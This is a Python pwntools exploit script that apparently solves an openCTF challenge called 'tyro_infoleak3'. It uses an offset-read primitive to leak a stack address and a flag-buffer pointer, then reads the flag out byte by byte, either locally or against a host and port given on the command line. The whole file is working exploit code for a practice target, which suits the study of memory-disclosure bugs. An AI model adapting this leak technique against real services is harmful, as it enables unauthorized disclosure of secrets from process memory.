#!/usr/bin/env python

from pwn import *
import sys

def exploit(r):

	r.recvuntil('Offset: ')
	inBuf = '0x'
	for i in reversed(range(4)):
		r.sendline(str(i))
		char = r.recvline().strip()[2:]
		if len(char) == 1:
			char = '0' + char
		inBuf += char
		r.recvuntil('Offset: ')

	inBuf = int(inBuf, 16)
	log.info("Stack at:\t\t" + hex(inBuf))

	flag_addr = '0x'
	for i in reversed(range(9, 12)):
		r.sendline(hex(i)[2:])
		char = r.recvline().strip()[2:]
		if len(char) == 1:
			char = '0' + char
		flag_addr += char
		r.recvuntil('Offset: ')

	flag_addr += '08'
	flag_addr = int(flag_addr, 16)
	log.info("Flag at buffer:\t" + hex(flag_addr))
	

	flag_full = ''
	offset = ((flag_addr - inBuf) & 0xffffffff) + 16+8+8+8
	for i in range(8):
		r.sendline(hex(offset)[2:])
		flag_part = r.recvline().strip()
		if '0xa' in flag_part:
			flag_full += flag_part[3:].decode('hex')
			break
		flag_full += flag_part[2:].decode('hex')
		r.recvuntil('Offset: ')
		if '00' in flag_part or 'a' in flag_part:
			break
		offset += 1


	print flag_full

	# even_a_tiny_relative_leak_will_pwn_things

	r.interactive()


if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['/vagrant/openCTF/tyro_infoleak3_b2d435964aac6bc1098ce62d35cba9af'])
        print util.proc.pidof(r)
        pause()
        exploit(r)